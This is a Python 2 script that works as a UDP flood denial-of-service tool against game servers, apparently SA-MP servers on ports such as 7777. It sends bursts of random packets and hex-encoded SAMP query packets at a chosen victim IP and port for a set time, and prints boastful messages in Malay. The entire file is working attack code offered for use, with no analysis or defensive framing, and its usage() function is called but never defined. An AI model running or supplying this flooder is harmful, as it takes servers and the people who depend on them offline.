#!/usr/bin/env python2
import socket, struct, codecs, sys, threading, random, time, os

Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "client_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1000 representes one byte to the server
    bytes = random._urandom(1000)
    byte = random._urandom(1490)
    byt = random._urandom(1024)
    by = random._urandom(20000)
    b = random._urandom(1475)
    a = random._urandom(1180)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        client.sendto(byte, (victim, vport))
        client.sendto(byt, (victim, vport))
        client.sendto(by, (victim, vport))
        client.sendto(b, (victim, vport))
        client.sendto(a, (victim, vport))
        msg = Data[random.randrange(0, 3)]
        client.sendto(bytes, (victim, int(vport)))
        client.sendto(msg, (victim, int(vport)))
        if int(vport) == 7777:
            client.sendto(Data[5], (victim, int(vport)))
        elif int(vport) == 7792:
            client.sendto(Data[4], (victim, int(vport)))
        elif int(vport) == 7771:
            client.sendto(Data[6], (victim, int(vport)))
        elif int(vport) == 7784:
            client.sendto(Data[7], (victim, int(vport)))
        sent = sent + 1
        print " ICJEY & ISPIRIT SEND PACKET %s TOK TOK BARANG SAMPAI IP %s DAN MEMBERI NASI KE PORT %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()